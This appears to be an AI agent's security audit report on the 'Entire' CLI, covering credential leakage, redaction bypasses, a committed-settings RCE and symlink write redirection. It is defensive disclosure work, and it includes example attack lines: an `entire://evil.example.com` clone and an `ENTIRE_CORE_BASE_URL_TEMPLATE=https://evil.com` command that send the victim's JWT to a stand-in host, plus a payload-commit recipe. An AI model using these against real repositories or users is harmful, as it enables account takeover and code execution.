**Please do not report security vulnerabilities through public GitHub issues.**

- Official Entire GitHub repositories

Destroying a user's work is a bug report; doing it to a ref the user controls from remote-supplied data is worse.
7. **Remote helper.** `internal/remotehelper/` implements a git remote helper - it receives commands on stdin from git. Treat that stdin as untrusted and look for injection or path traversal there.

Six deep-dive agents are still working (they've spawned sub-agents of their own — 14 running). Rather than leave you with nothing while they finish, here's what I've verified independently. I'll consolidate their findings into a full report when they land.

## What I found myself

**One real finding: the checkpoint git credential is attached unscoped.** `cmd/entire/cli/checkpoint/remote/git.go:699` sets `http.extraHeader` rather than the URL-scoped `http.<url>.extraHeader`:

```go
fmt.Sprintf("GIT_CONFIG_KEY_%d=http.extraHeader", idx),
fmt.Sprintf("GIT_CONFIG_VALUE_%d=Authorization: Basic %s", idx, encoded),
```

That header is applied to *every* HTTP request the child git process makes, not just the resolved target. It's set in `newCommand` (git.go:544), so every fetch/push/ls-remote in that package carries it whenever `ENTIRE_CHECKPOINT_TOKEN` is set. Git passes custom headers to curl via `CURLOPT_HTTPHEADER`, and curl re-sends those across redirects including cross-host — it only strips auth it generated itself. So any cross-host redirect, or any submodule recursion inheriting the env (submodule URLs come from repo-committed `.gitmodules`), sends the bearer to a host that isn't the intended one.

I could not build a confirmed cross-host leak, and I want to be precise about why: `providerHost` (`checkpoint/remote/util.go:621`) is a strict allowlist of `github.com` and `gitlab.com`, so a repo-committed `checkpoint_remote` cannot redirect the push to an arbitrary host, and `checkpoint_push_remote` is a remote *name* that must already exist in local git config. That containment is good design and it's what keeps this from being critical. But the unscoped header means any future "wrong remote" bug upgrades directly into credential disclosure, and scoping it costs one string change. This is the practice `actions/checkout` follows for exactly this reason, and it's the kind of thing a bounty researcher reports.

**Two lower-severity notes.** The repo key derived from the origin remote reaches the agent's model context raw (`lifecycle.go:437`); they filter control characters at a shared chokepoint (`gitremote.go:258`, with a comment showing they already fixed that vector) but not printable prompt-injection prose in `owner/repo`. It's heavily gated — injection only fires when the API reports trails enabled for that repo — so it's a hardening item, not a live vuln. Separately, `versioncheck/autoupdate.go:151-157` hands a command string to `sh -c`/`cmd /C`; I traced `updateCommand` and every branch returns a static literal, with the server-supplied `latestVersion` never reaching it, so it is not injectable today. It's a latent footgun against your own CLAUDE.md rule, worth a guard comment.

**Dependencies are clean.** `govulncheck` reports zero vulnerabilities in called code. The four it flags (`cel-go`, two `x/mod` sumdb issues, `x/crypto/openpgp`) are all transitive with no call path — neither package is imported anywhere in your code.

## Surfaces I checked and found genuinely solid

The `entire mcp` server is read-only with two tools, no exec and no path parameters. Plugin archive extraction sidesteps zip-slip architecturally by only ever extracting one matched entry to a fixed destination, plus a `safeArchiveEntry` check rejecting `../`, absolute paths and NUL. Plugin downloads refuse plaintext HTTP with a genuinely well-reasoned explanation, require a checksum manifest by default, and need explicit `--allow-unverified` to bypass — the residual same-origin trust limitation is documented honestly (adding signing would close it). `plugin_gitremote.go` defends the `--upload-pack=` argument-injection class with `--` separators and a scheme allowlist. `core.sshCommand` is only ever re-exported from the user's own git config, never repo content. `doctor bundle` redacts by default, excludes `.entire/metadata/`, and its error path falls through to a second redactor rather than to raw. The `RedactedBytes` type marker is used correctly at every `AlreadyRedacted` call site I traced, including the one that feeds a summary to an LLM. `io.LimitReader` with `+1` overflow sentinels is applied consistently, including on hook stdin. Cross-host redirects are explicitly rejected in the API clients, and both `math/rand` uses are jitter/load-spreading with `crypto/rand` used where it matters.

## Still pending

The six deep dives cover malicious-repo code execution, path traversal and arbitrary file write, credential handling and token misdirection, the redaction/OPF pipeline (including the fail-open-on-size-cap question, which is the highest-severity class here), untrusted input parsing, and git remote election. Those are where the serious findings would live if they exist — my sweep was breadth-first and deliberately avoided duplicating them. I'll verify anything they flag against the actual code before reporting it, since a plausible-sounding finding that doesn't survive tracing is worse than no finding.

# Credential leakage & token misdirection — audit findings

## 1. CRITICAL — `entire://` remote URL redirects the raw login JWT to any host. CONFIRMED (PoC passes)

**Chain:** `cmd/git-remote-entire/main.go:104` (`clusterHost` ← remote URL) → `internal/remotehelper/replicas/replicas.go:44-47` (`entryURL = "https://" + clusterHost`) → `main.go:379` `ResolveClusterAuth` → `main.go:388` `NewRefreshingLoginCredential` → `main.go:225` `req.Header.Set("Authorization", "Bearer "+token)`.

The only trust gate is `requireActiveContext` (`internal/entireclient/clusterdiscovery/resolve.go:236-256`): it fetches `https://<clusterHost>/.well-known/entire-cluster.json` and requires the active context's `CoreURL` to appear in the returned `core_urls`. **That document is served by the host you are about to send the credential to.** An attacker simply advertises the real core (`https://us.auth.entire.io`) and the gate passes.

Attacker-controlled input: the host in an `entire://` URL — a phished clone command, a README, or a pre-set `remote.<n>.url` in a shared clone.

```
git clone entire://evil.example.com/gh/acme/app
→ GET https://evil.example.com/gh/acme/app/info/refs?service=git-upload-pack
   Authorization: Bearer <victim's refreshed login JWT>
```

**Impact:** discloses the control-plane bearer — the same token `entire api --to core` uses for org/project/repo/grant administration. Full account takeover, silent, no prompt. The `ENTIRE_TOKEN` path (`main.go:414-433`) has identical exposure: `coreTrusted` compares the token's `aud` against the attacker's own self-asserted list.

**Verify:** PoC saved at `/private/tmp/claude-501/-Users-soph--herdr-worktrees-cli-soph-pen-test/8e1739dd-4a9c-4e02-a456-708769e19893/scratchpad/poc_attacker_cluster_host_test.go` — drop into `internal/entireclient/clusterdiscovery/` and run. It passes: host `evil.example.com` is bound to the victim's real login context.

**Root cause is a design inconsistency, and the fix already exists in-tree.** The data-API path does this correctly (`docs/architecture/upstream-host-resolution.md:132-146`): the well-known list gates *eligibility only*, and the credential sent is an **audience-scoped** token minted at the context's own core (`auth/data_api.go:93-98`). Same for `ResolveControlPlaneTargetForCluster` (`auth/control_plane.go:96-102`), which dials the local `c.CoreURL`, never the queried host. The git path skips the exchange entirely. Worse: `ClusterAuth.JurisdictionAudience` / `JurisdictionCoreURL` are already discovered, cached and returned (`resolve.go:53-58, 97-98`) — and **no production code reads them** (grep confirms; the "jurisdiction token" comment at `main.go:449` is vestigial). Fix: exchange at the *context's* core for a cluster-scoped audience, and have the core validate the requested audience against its own cluster registry — the self-asserted audience must not be trusted either.

## 2. HIGH — redaction skip-list lets credentials into committed *and pushed* checkpoints. CONFIRMED

`redact/redact.go:832-863`. `redact.JSONLBytes` is the single gate on every transcript write path (`checkpoint/persistent.go:496,555,1064,2615` — the `entire/checkpoints/v1` branch PrePush pushes). Two defects skip keys/subtrees **before** any of the 8 detection layers run:

- `strings.HasSuffix(lower, "id")` (`:845`) is a suffix test on the whole key — skips `id`, `token_id`, `sid`, `credentialid`. Same for `HasSuffix(…,"signature")` (`:840`) and the `path`/`cwd`/`dir`/`root` set (`:851`).
- `shouldSkipJSONLObject` (`:860-863`) uses `HasPrefix(t, "image")` and returns before the walker descends, exempting the **whole object subtree** at any depth.

Empirically verified — JWT survives verbatim in `{"type":"text","id":…}`, `{"type":"text","x_signature":…}`, `{"type":"image_url","authorization":"Bearer …"}`, `{"type":"image","source":{"creds":{"bearer":…}}}`; the `tool_result`/`content` control case redacts correctly. **Impact:** permanent credential disclosure in git history on the checkpoint remote. Fix: invert to exact-match allowlists, and scope the image skip to the base64 payload leaf only.

## 3. HIGH — checkpoint token injected as an unscoped `http.extraHeader`. CONFIRMED

`cmd/entire/cli/checkpoint/remote/git.go:699` sets `GIT_CONFIG_KEY_<n>=http.extraHeader` with no URL scope, so `Authorization: Basic base64("x-access-token:"+token)` applies to **every** HTTP request that git process makes. The gate at `:585-587` checks protocol only, never host; `deriveTokenOriginURL` (`util.go:604-619`) accepts any host. A remote pointing at `https://attacker.example/x/y.git` — or a redirect from the real one (git's default `followRedirects=initial`, and a raw `extraHeader` gets none of git's credential-helper cross-host protection) — receives the PAT. `git.go:622-627` even rewrites SSH remotes to HTTPS *so the header applies*. Secondary: the credential sits in `GIT_CONFIG_VALUE_<n>` in the child environment, inherited by every git subprocess (hooks, credential helpers, `core.askPass` — several nameable by a malicious repo) and readable via `/proc/<pid>/environ`. Fix: `http.<origin>.extraHeader` **plus** a host allowlist before attaching.

## 4. MEDIUM — `entire doctor bundle` inherits finding 2

`cmd/entire/cli/doctor_bundle.go:280-290` routes `.json`/`.jsonl` entries through `redact.JSONLContent`. The bundle exists to be emailed to support and advertises "secrets are redacted" (`:30`); `id`/`session_id`/`checkpoint_id` pass a full JWT through. Credit where due: the bundle collects no `contexts.json`, no token store, no env vars, no `git config` dump, and `git remote -v` credentials (`:123`) are correctly caught by `credentialedURIPattern`.

## 5. MEDIUM — login JWT sent to a control-plane-nominated cell URL, no host allowlist. PLAUSIBLE

`cmd/entire/cli/auth/cell_data_api.go:149` — `api.NewClientWithBaseURL(f.subject.loginJWT, cellBaseURL)`. `cellBaseURL` is the `apiUrl` field of a `/api/v1/clusters` response (`:604-658`, and `cell_target.go:105`, `cell_fanout.go` `resolveCellBaseURLs`). The only validation is `requireSafeExchangeURL` (`:548-560`), which enforces https + non-empty host — **not** that the host belongs to Entire. Its own doc comment claims to stop "a buggy core catalog" smuggling the JWT off https; it stops `ftp://`, not `https://evil.com`. Reached by `entire api --to cell`, `experts`, `search` fan-out, and `explain --repo` (`explain_repo.go:36-40`). This is the only one of eight `NewClientWithBaseURL` call sites using a server-supplied URL — the rest use the local context's `coreURL`. Precondition: a compromised or misconfigured control plane (`ListClusters` is the only cluster op in the CLI, so `apiUrl` is operator-set). Report-worthy as SSRF-with-credentials: no host pinning on a credentialed request derived from a server response. Note `--insecure-http-auth` (process-global, `auth/exchange.go:28`) disables even the https check.

## 6. MEDIUM — `ENTIRE_TLS_SKIP_VERIFY=true` silently disables cert verification on the credential path

`cmd/git-remote-entire/main.go:104`, flowing into the discovery transport (`:118`), the token-refresh leg (`:388`), and the bearer-carrying proxy (`:141`). An **env var, not a flag**, with no stderr warning — settable by a wrapper script, CI config, `.envrc`, or a repo-managed `mise.toml [env]`. It collapses finding 1's already-weak trust gate to nothing (the code says so at `:410-415`, but nothing enforces it) and converts finding 9 from theoretical to live. Contrast `--insecure-http-auth`, which is a real flag and cannot be set from env or config.

## 7. MEDIUM-LOW — unvalidated env templates become token-exchange destinations

`auth/cell_data_api.go:525` (`ENTIRE_CORE_BASE_URL_TEMPLATE`) and `:501` (`ENTIRE_API_AUDIENCE_TEMPLATE`) are interpolated with no allowlist, then `jurisdictionCoreURL`'s result is POSTed the login JWT as `subject_token` (`:187` → `httputil.PostOAuthToken`, form built at `httputil/oauth.go:32-42`). `ENTIRE_CORE_BASE_URL_TEMPLATE=https://evil.com entire auth token --jurisdiction us` exfiltrates the login JWT. Undocumented env vars that are credential-destination switches.

## 8. LOW — `httpdebug` is a narrow denylist; URL query strings not redacted at all

`internal/remotehelper/httpdebug/redact.go`: headers list only `Authorization`/`Proxy-Authorization` (`:33-37`) — `Cookie`, `Set-Cookie`, `X-Api-Key`, `Private-Token` dump verbatim; JSON bodies cover only four `*_token` keys (`:63`) — not `code`, `client_secret`, `device_code`, `password`; and `urlUserinfoRedactor` (`:70`) matches only userinfo before `@`, so `?code=…` / `?access_token=…` in the logged request line goes out in full. Scope keeps this low: gated on `ENTIRE_DEBUG`, stderr only (never `.entire/logs/`), and `body=false` on request dumps so the exchange POST body is never printed. Redact-before-truncate ordering is correct.

## 9. LOW — no `CheckRedirect` on the OAuth token-endpoint client

`auth-go .../internal/oauthhttp/httpclient.go:18-23` returns a bare `&http.Client{}`; grep finds no `CheckRedirect` anywhere in that module. Go follows 307/308 **preserving method and body**, and the bodies carry `refresh_token` (`refresh/refresh.go:256`) and `code`+`code_verifier` (`authcode.go:643-648`) — body secrets are never stripped, so PKCE gives no protection. Not independently exploitable: the endpoint host is pinned three ways. Matters under `--insecure-http-auth`, a loopback `http://` issuer, or finding 6. One-line fix: `http.ErrUseLastResponse`.

## 10. LOW — entropy layer structurally cannot flag any secret ≤22 chars

`redact/redact.go:61` (`entropyThreshold = 4.5`) vs `:865` (`shannonEntropy` returns bits **per character**). Max possible entropy for length *n* is log₂(*n*); log₂(22)=4.459 < 4.5. Mitigated by layer 2 (betterleaks, 260+ vendor rules); the residual gap is a short *opaque* Entire-issued credential no vendor rule knows. Full JWTs are comfortably caught (verified end-to-end across bare value, `Bearer` header, curl line, `ENTIRE_TOKEN=`, JSON, JSONL).

## 11. Latent — `Proxy.checkRedirect` fails open on empty `clusterHost`

`internal/remotehelper/transport/proxy.go:196-204`: when `clusterHost == ""` the strip is skipped and line 203 **re-adds** an `Authorization` Go had already stripped cross-host; `hostInCluster` (`:212-216`) returns `true` for the same case, so `setAuthOrError` doesn't backstop it. Not reachable today — `main.go:93-98` exits 128 on an empty/forge host. Fix: fail closed.

## Surfaces that are genuinely solid

**PKCE/state/callback:** S256-only (`plain` unimplemented), 48-byte verifier + 24-byte state from `crypto/rand`, state validated before the code is redeemed, first-result-wins channel, binds `127.0.0.1:0` with only `/callback` registered, no CORS. **Issuer adoption** (`login.go:563-631`): exact origin or https strict-subdomain on the same port with leading-dot label boundary — `auth.entire.io.evil.com` and `xauth.entire.io` both rejected, and `NormalizeOriginURL` rebuilds from parsed parts so there's no check/use parser gap. **No server-driven OAuth endpoint discovery** — all paths compile-time constants; absolute-path overrides rejected. **`verification_uri`** validated (userinfo rejected, IDN rejected, https-or-loopback). **Refresh is pinned** to the stored context's own `CoreURL`. **`entire api` passthrough:** placeholders expand *before* `validateAPIPath`, which rejects any scheme/host; plus `requireSameHost` and `rejectCrossHostRedirect` in `api/client.go:74-100` — hardened. **Cross-jurisdiction transport** (`internal/coreapi/cross_juris_transport.go`): exact-host + exact-path + https-or-loopback on `token_exchange_url`, 421 targets validated against the responding core's federation manifest, per-origin token cache, no header inheritance across hops. **Replica trust domain** (`discovery/parse_replicas.go:45-87`): publicsuffix floor, IP literals refused the wildcard, on-disk node cache filtered before use. **Discovery fetches** are https-hardcoded with redirects refused. **Token store**: `0600` + atomic rename + `flock`, dir `0700`, loose-perms warning; `contexts.json` stores no tokens, only keychain slot pointers; no silent keyring→plaintext downgrade; `testdirs` gated on real `testing.Testing()`, not spoofable. **Settings cannot inject env** — a malicious repo cannot redirect the token store; `checkpoint_remote`'s `provider` is a strict `github.com`/`gitlab.com` allowlist. **No credential reaches `.entire/logs/`**; telemetry and `entire status --json` expose none; browser-open passes the URL as one argv element with a scheme check, no shell.

**One theme across findings 1, 3, 5 and 11:** a credential is attached on the basis of protocol, prior state, or a self-asserted document rather than a positive host check. Making host-allowlisting the precondition for attaching any credential fixes all four.</result>

# Entire CLI — Security Audit

**Date:** 2026-08-19 · **Tree:** `soph/pen-test` @ `f3c9f1428` · **Scope:** full codebase (216k LOC non-test, 600 files)

Threat model calibrated to `SECURITY.md`: advisory-grade means exploitable by a **remote or non-local actor**. For a local dev tool that means a malicious repository, a malicious server, or a malicious agent transcript. Local-only DoS/ReDoS is explicitly out of scope and is not reported here.

Findings marked **[verified]** were reproduced or traced link-by-link by the lead reviewer. Findings marked **[agent]** come from a dimension agent and are reported with their evidence but were not independently re-derived.

---

## The root cause behind the two worst findings

`.entire/settings.json` is **git-tracked, repo-committed, and loaded as trusted configuration**. `settings.Load()` (`cmd/entire/cli/settings/settings.go:462`) merges exactly three layers — the committed project file, clone-local `.git/entire/preferences.json`, and gitignored `settings.local.json`. There is no user-global settings file, and no allowlist separating keys that are safe to commit from keys that are dangerous. Every field in the struct is therefore attacker-settable by anyone who can land a file in the repo.

Exactly one key gets ownership treatment (`CheckpointRemoteIsLocalOnly`, `settings.go:1446`), and that guard is itself bypassable (C4 below).

The correct model already exists in the codebase. `plugin_index.go:24-31` refuses to let a committed file redirect the plugin index, with the comment *"no repo-committed file can redirect GOPROXY; npm's per-project registry override is the cautionary counter-example."* That reasoning was never applied to settings.

---

## CRITICAL

### C1 — Remote code execution on `git push` via a repo-committed setting **[verified]**

`redaction.openai_privacy_filter.command` becomes `argv[0]` of an `exec.CommandContext` call.

Chain, every link read:

| Step | Location |
|---|---|
| Field is a plain string | `settings/settings.go:303` |
| Validator checks `categories`, `timeout_seconds`, `prompt_default` — **never `command`** | `settings/settings.go:1178` |
| Passed verbatim to the redaction runtime | `strategy/common.go:459` |
| `newShellOut(cfgCopy.Command, …)` | `redact/opf.go:62` |
| **Sink:** `s.commandRunner(callCtx, s.command, …)` where `commandRunner = exec.CommandContext` | `redact/opf.go:414`, `:342` |
| Wired on every git hook | `hooks_git_cmd.go:148` |
| Fires in pre-push | `strategy/manual_commit_push.go:139-179` |

Verified locally: `LoadFromBytes` parses an arbitrary relative path into `Command`, and `validateOPFSettings` accepts it without complaint.

Exploit shape — commit two files:

```
.entire/opf                 # mode 755, attacker payload (git preserves the exec bit)
.entire/settings.json       # {"redaction":{"openai_privacy_filter":{
                            #   "enabled":true,"prompt_default":"always",
                            #   "categories":{"private_person":true},
                            #   "command":"./.entire/opf"}}}
```

`exec.Command` with a name containing a path separator resolves relative to cwd and bypasses Go's `exec.ErrDot` protection entirely (that guard only covers PATH lookups of bare names). Two independent agents confirmed execution end-to-end with a marker file.

The prompt is not a control: `prompt_default: "always"` skips it, and `manual_commit_opf_prompt.go:61-72` returns `OPFRun` when there is no TTY — so agent-driven and CI pushes auto-run. When the prompt *is* shown it never displays which command will run.

Secondary impact: a `command` naming a nonexistent binary fail-closes **every** `git push` in the repo.

A JSON settings diff does not read as executable to a reviewer, which makes this viable through an ordinary pull request.

**Fix:** require `command` to come from `settings.local.json` or clone preferences, and reject any path separator in favour of `exec.LookPath`.

### C2 — `entire://` remote URL redirects the control-plane bearer to any host **[verified]**

The trust anchor for sending the login JWT is a document served by the host that receives it.

| Step | Location |
|---|---|
| `clusterHost` taken from the remote URL; only checks non-empty and not-a-forge-id | `cmd/git-remote-entire/main.go:88-98` |
| → `ResolveClusterAuth(…, parsedURL.Host, …)` | `main.go:379` |
| → `Discover(ctx, clusterHost, …)` fetches `https://<clusterHost>/.well-known/entire-cluster.json` | `clusterdiscovery/discovery.go:133` |
| Attacker-supplied `body.CoreURLs` becomes `entry.CoreURLs` | `clusterdiscovery/resolve.go:204` |
| Gate: is the active context's `CoreURL` a **member of that attacker-supplied list**? | `resolve.go:91`, `:252`, `contextEligible:287` |
| → refreshed **login JWT** | `main.go:388` `NewRefreshingLoginCredential` |
| → `req.Header.Set("Authorization", "Bearer "+token)` | `main.go:225` |

The attacker advertises the real core (`https://us.auth.entire.io`, public knowledge) in their own well-known document and the gate passes.

```
git clone entire://evil.example.com/gh/acme/app
→ GET https://evil.example.com/gh/acme/app/info/refs?service=git-upload-pack
   Authorization: Bearer <victim's refreshed login JWT>
```

The one guard at `main.go:215` refuses to attach credentials unless the request matches a recognised git smart-HTTP endpoint — but that checks the **path shape**, never the host, and the attacker controls both. The `ENTIRE_TOKEN` path (`main.go:414-433`) has identical exposure: `coreTrusted` compares the token's `aud` against the attacker's own self-asserted list.

Impact: discloses the control-plane bearer — the same token `entire api --to core` uses for org/project/repo/grant administration. Account takeover, silent, no prompt.

**The correct pattern already exists in-tree.** The data-API path gates *eligibility* on the well-known list but sends an **audience-scoped** token minted at the context's own core (`auth/data_api.go:93-98`); `ResolveControlPlaneTargetForCluster` dials the local `c.CoreURL` and never the queried host. The git path skips the exchange. `ClusterAuth.JurisdictionAudience` / `JurisdictionCoreURL` are already discovered, cached and returned (`resolve.go:97-98`) and **no production code reads them** — grep confirms only struct/cache definitions.

**Fix:** exchange at the context's own core for a cluster-scoped audience, and have the core validate the requested audience against its own cluster registry. The self-asserted audience must not be trusted either.

---

## HIGH

### H1 — Redaction fail-open: detection succeeds, substitution silently no-ops **[verified, reproduced]**

`applyJSONReplacements` (`redact/redact.go:703-727`) detects secrets on the **decoded** JSON leaf, then re-encodes the original with Go's canonical encoder (`jsonEncodeString`, `:883`) and does a **literal substring replace on the raw line**. When the producer's byte-level encoding differs from Go's, the replace finds nothing, does nothing, and returns the line unchanged — **no error, no fallback, no log**.

Reproduced with a `ghp_` PAT that redacts correctly in the control case:

| Input leaf | Result |
|---|---|
| `{"text":"hi <PAT>"}` (control) | redacted |
| `{"text":"a\/b <PAT>"}` — `\/` is legal JSON that Go never emits | **LEAKED** |
| leaf containing raw U+2028 | **LEAKED** |
| leaf containing raw U+2029 | **LEAKED** |
| `{"text":"a\ud800b <PAT>"}` — lone surrogate → U+FFFD | **LEAKED** |
| invalid UTF-8 in leaf | **LEAKED** |

Granularity is **per-leaf**, not per-line — a trigger character in a *different* leaf does not affect the secret's leaf (verified both directions).

Why this fires in practice with no attacker: Node's `JSON.stringify` does **not** escape U+2028/U+2029, while Go's encoder does. Claude Code, Gemini CLI, opencode and Copilot CLI are all Node-based. U+2028 arrives via text pasted from Word/PDF/minified JS. Lone surrogates arise from a streaming chunk boundary splitting a surrogate pair. PHP's `json_encode` emits `\/` by default. And in agent transcripts a single `text` leaf routinely holds an entire message or whole tool output, so a stray separator and a secret sharing one leaf is ordinary, not contrived.

Every stored transcript funnels through `redact.JSONLBytes` → post-commit condensation (`manual_commit_condensation.go:523`), Stop finalize (`manual_commit_hooks.go:2909`), shadow write (`persistent.go:2579`), pre-push OPF batch (`redact/batch.go:155`) — landing in `full.jsonl` on `entire/checkpoints/v1` and pushed.

**Fix:** detect that a replacement did not apply and fail closed (drop the line or the transcript), or re-serialise the parsed value instead of patching raw bytes.

### H2 — Redaction skip-list abandons whole subtrees **[verified, reproduced]**

`redact/redact.go:832-863`. Two pre-detection skips run **before** any of the 8 layers:

- `shouldSkipJSONLField`: `strings.HasSuffix(lower,"signature")`, `HasSuffix(lower,"id")`, `HasSuffix(lower,"ids")`, plus exact `filepath`/`file_path`/`cwd`/`root`/`directory`/`dir`/`path`. A suffix test on the whole key catches `id`, `session_id`, `token_id`, `sid`, `credentialid`.
- `shouldSkipJSONLObject`: `HasPrefix(t,"image")` or `t == "base64"` — and the walker does `return`, so the **entire object subtree including siblings** is never scanned.

Because the skip is keyed on the key name / object type rather than the value, a skipped key whose value is an *object* hides an arbitrarily deep subtree.

Reproduced 9/9 — identical secrets redact in `content` and leak in every skipped position, including `{"type":"image_url","image_url":{"url":"https://u:<PAT>@h/x.png"}}`, `{"type":"image","source":{"creds":{"bearer":"<JWT>"}}}`, and `{"path":"/v1/x?access_token=<JWT>"}`. The `path` skip is the realistic one — HTTP-client MCP tools routinely pass `{"path":"/v1/x?api_key=…"}`.

Note both skips are deliberate and have real justifications (thinking-signature replay; base64 tripping the entropy layer). The fix must preserve those: **exact-match allowlists**, and scope the image skip to the base64 payload **leaf**, not the object.

### H3 — Task/subagent shadow write stores the transcript with zero redaction **[agent, code confirmed]**

`checkpoint/ephemeral.go:410-441`: `os.ReadFile(opts.TranscriptPath)` → `ChunkTranscript` → `CreateBlobFromContent`, with **no redact and no sanitize call**. The very next block (`:446-455`) *does* call `redact.JSONLBytes` on the subagent transcript — the asymmetry inside one function reads as an oversight, not a design choice. Confirmed by reading both blocks.

The agent empirically recovered an unredacted `ghp_` PAT from the resulting shadow-tree blob.

**Tree-path collision:** it writes `.entire/metadata/<sessionID>/full.jsonl` — byte-identical to where the metadata-dir walker writes the *redacted* copy (`ephemeral.go:990`). The raw blob therefore **replaces** the redacted one on the shadow branch, and poisons the `CheckpointTranscriptSize` growth baseline.

Trigger: every Claude Code `Task` completion (`lifecycle.go:1314`, `:1417` → `SaveTaskStep`).

Exposure: shadow branches are not in `refs.Push`, so the hook never pushes them — but they are real `refs/heads/entire/*` branches, so `git push --all`, `--mirror`, `refs/heads/*:refs/heads/*`, or a `remote.<n>.push` refspec all ship them. Your own comment at `ephemeral.go:92-95` names this risk.

### H4 — Transcript exfiltration via committed checkpoint remote, and a bypassable ownership guard **[verified]**

Two composing defects.

**(a) Committed `checkpoint_remote` skips the single-remote gate.** `manual_commit_push.go:93-101`: when `ps.hasCheckpointURL()` is true, the election and destination check are skipped entirely. The only brake, `checkpointRemoteIsInherited` (`checkpoint/remote/util.go:405-442`), compares **owners only, not the repo** — so any repo under the same org is an accepted destination, and the victim has push access. Private source and prompts land in a public repo of the same org. `providerHost` (`util.go:621`) does correctly limit the host to `github.com`/`gitlab.com`, which prevents an arbitrary-host redirect.

**(b) A *tracked* `.entire/settings.local.json` defeats the guard completely.** `CheckpointRemoteIsLocalOnly` (`settings.go:1446`) treats a `checkpoint_remote` in that file as necessarily the local developer's own choice, resting entirely on `.entire/.gitignore` listing it. **Gitignore does not apply to already-tracked files.** Verified with real git: `git add -f .entire/settings.local.json`, commit, clone — the file arrives in the clone, is tracked, and `git status` is **clean**, so it is invisible to the victim. Cross-owner exfiltration with the guard fully bypassed.

**Fix:** verify the file is untracked (`git ls-files --error-unmatch`) before granting local-only trust; compare full `owner/repo`, not owner alone.

**Stealth amplifier:** commit a bogus `checkpoint_push_remote` alongside. `computeCheckpointSyncInfo` (`status.go:279-289`) returns early on the fail-closed election error so `entire status` reports checkpoint sync as broken, while `PushURL` never consults `checkpoint_push_remote` and keeps syncing to the attacker URL.

### H5 — Repo-committed symlinks redirect Entire's writes outside the repo (CWE-59) **[agent, two independent confirmations]**

Entire writes fixed repo-relative paths with plain `os.WriteFile`/`os.OpenFile` — no `O_NOFOLLOW`, no `os.Root`. Git happily checks out a tracked symlink at those exact paths (it only blocks `.git`-named components, not symlink *targets*).

Strongest instance fires with **no user action beyond opening an agent in the clone**: `EnsureEntireGitignore` (`strategy/common.go:1252-1300`) is reached from `EnsureSetup`, which the turn-start hook calls **every turn** (`lifecycle.go:573`). Both the `os.ReadFile` (`:1262`) and the `os.WriteFile` (`:1299`) follow the link. Both agents verified out-of-repo files being appended to and created.

Other sites: `logging/logger.go:127` (`O_CREATE|O_APPEND`, unbounded append to an arbitrary file on every hook invocation — verified 28 → 1320 bytes after one `git commit`, and the attacker also controls `log_level` in the same settings file); `agent/opencode/hooks.go:82` (**unconditional overwrite**, the only agent installer with no foreign-file marker guard — compare `agent/pi/hooks.go:90`, which refuses); the five agent hook-config installers (read-merge-write into any valid JSON file); `trail_checkout_worktree.go:117,134`; `strategy/manual_commit_hooks.go:129,153`; `runner_setup.go:240`.

Content control is limited (fixed ignore rules, slog JSON, Entire's own hook config), so this is a file-planting/integrity/DoS primitive rather than direct RCE — but it triggers on clone + open an agent, which is exactly the shape a third party files.

Audit complete. Tree is clean — all probe files removed, build verified.

## Bottom line

**Two critical, eight high, seventeen medium.** One root cause produces most of the worst ones: **`.entire/settings.json` is git-tracked and loaded as trusted configuration.** `settings.Load()` merges the committed project file with no allowlist separating keys that are safe to commit from keys that control execution and data destinations. Every field is attacker-settable by anyone who lands a file in the repo — including via an ordinary pull request.

Your codebase already contains the correct model. `plugin_index.go:24-31` refuses to let a committed file redirect the plugin index, citing npm's per-project registry override as the cautionary counter-example. That reasoning was never applied to settings.

## The two criticals (both traced link-by-link myself)

**C1 — RCE on `git push`.** `redaction.openai_privacy_filter.command` becomes `argv[0]` of `exec.CommandContext` at `redact/opf.go:414`. `validateOPFSettings` (`settings.go:1178`) checks `categories`, `timeout_seconds` and `prompt_default` — it never checks `command`. I confirmed with a test that `LoadFromBytes` parses an arbitrary relative path into that field and the validator accepts it. Commit `.entire/opf` mode 755 plus a settings file naming `./.entire/opf`, and it runs on the victim's next push. A name containing a path separator bypasses Go's `exec.ErrDot` protection entirely, since that only guards PATH lookups of bare names. `prompt_default: "always"` removes the prompt, and `manual_commit_opf_prompt.go:61-72` auto-runs when there's no TTY, so CI and agent-driven pushes never ask. A JSON settings diff does not read as executable to a reviewer. Two agents independently executed this end-to-end.

**C2 — the control-plane bearer can be sent to any host.** `git clone entire://evil.example.com/gh/acme/app` sends your refreshed login JWT to `evil.example.com`. The trust gate fetches `https://<attacker-host>/.well-known/entire-cluster.json` and checks only that your active context's `CoreURL` appears in the list **the attacker just served**. Advertising the real core (public knowledge) passes it. The guard at `main.go:215` refuses to attach credentials to unrecognised endpoints, but it checks the URL *path shape*, never the host, and the attacker controls both. This discloses the same token `entire api --to core` uses for org and grant administration.

The fix for C2 already exists in your tree: the data-API path gates *eligibility* on the well-known list but sends an audience-scoped token minted at your own core. `ClusterAuth.JurisdictionAudience` and `JurisdictionCoreURL` are already discovered, cached and returned — and no production code reads them.

## Redaction fails open four independent ways, always silently

This is the cluster I'd worry about most for a bounty claim, because the first one needs **no attacker at all**.

`applyJSONReplacements` detects secrets on the decoded JSON leaf, then re-encodes with Go's canonical encoder and does a literal substring replace on the raw line. When the producer's encoding differs from Go's, the replace silently finds nothing and returns the line unchanged with no error and no log. I reproduced this: the same `ghp_` PAT redacts correctly in a clean leaf and ships intact when the leaf also contains `\/`, a raw U+2028 or U+2029, a lone surrogate, or invalid UTF-8. Node's `JSON.stringify` does not escape U+2028/U+2029 while Go's encoder does — and Claude Code, Gemini CLI, opencode and Copilot CLI are all Node-based. U+2028 arrives from text pasted out of Word, PDFs or minified JS. Failure is per-leaf, and in agent transcripts one `text` leaf routinely holds a whole tool output.

Separately: one **NUL byte** in the first 8 KB routes a metadata file to `CreateBlobFromContent` with zero redaction, on the branch that gets pushed — I read go-git's `IsBinary` and it returns true on the first `0x00` and nothing else. The skip-lists abandon whole subtrees (I reproduced 9/9 leaks, including `{"path":"/v1/x?access_token=…"}`, which HTTP MCP tools produce routinely). And `ephemeral.go:410-441` writes the task transcript with no redact call at all, while the correct call sits ten lines below it — the raw blob then overwrites the redacted copy, because both use the same tree path.

## Also worth your attention

Transcript exfiltration is live: a committed `checkpoint_remote` skips the single-remote gate entirely, and the only brake compares **owners, not repos**. Worse, a force-added `.entire/settings.local.json` completely defeats the ownership guard — that guard assumes the file "cannot have arrived by cloning," but gitignore doesn't apply to already-tracked files. I verified with real git that such a file survives a clone, stays tracked, and leaves `git status` **clean**, so it's invisible to the victim.

